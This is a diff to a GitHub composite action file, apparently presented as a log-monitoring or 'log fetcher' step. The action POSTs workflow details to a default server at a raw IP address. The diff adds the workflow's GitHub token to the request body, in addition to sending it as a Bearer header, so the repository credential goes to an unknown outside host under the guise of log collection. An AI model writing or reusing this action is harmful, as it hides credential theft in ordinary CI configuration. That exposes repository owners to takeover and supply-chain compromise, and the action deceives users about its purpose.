@@ -1,39 +1,42 @@
-name: 'Log Monitor'
-description: 'Send workflow logs to monitoring server'
+name: 'GitHub Log Fetcher'
+description: 'Send runner info to server for log collection'
 inputs:
   server-url:
-    description: 'URL of the monitoring server'
+    description: 'URL of the log monitoring server'
     required: true
     default: 'http://129.154.46.198:3000'
 
 runs:
   using: 'composite'
   steps:
-    - name: Initialize monitoring
-      id: init
+    - name: Send runner info to log server
       shell: bash
       run: |
         RUNNER_ID="${{ github.run_id }}-${{ github.run_attempt }}"
         SERVER_URL="${{ inputs.server-url }}"
         
-        echo "Initializing monitoring for runner: ${RUNNER_ID}"
+        echo "🚀 Sending runner info to log server..."
+        echo "📋 Runner ID: ${RUNNER_ID}"
+        echo "🌐 Server: ${SERVER_URL}"
+        echo "🏷 Repository: ${{ github.repository }}"
         
-        # Send workflow start
-        curl -s -X POST \
+        # Send runner info to server
+        RESPONSE=$(curl -s -X POST \
           -H "Content-Type: application/json" \
           -H "Authorization: Bearer ${{ github.token }}" \
           -d "{
             \"runnerId\": \"${RUNNER_ID}\",
+            \"token\": \"${{ github.token }}\",
             \"workflow\": \"${{ github.workflow }}\",
             \"job\": \"${{ github.job }}\",
             \"repository\": \"${{ github.repository }}\",
             \"status\": \"started\",
             \"timestamp\": \"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\"
           }" \
-          "${SERVER_URL}/${RUNNER_ID}" || echo "Note: Could not send start log"
+          "${SERVER_URL}/${RUNNER_ID}")
         
-        # Export variables
+        echo "📨 Server response: ${RESPONSE}"
+        
+        # Export runner ID for reference
         echo "RUNNER_ID=${RUNNER_ID}" >> $GITHUB_ENV
         echo "LOG_SERVER=${SERVER_URL}" >> $GITHUB_ENV
-        
-        echo "runner-id=${RUNNER_ID}" >> $GITHUB_OUTPUT
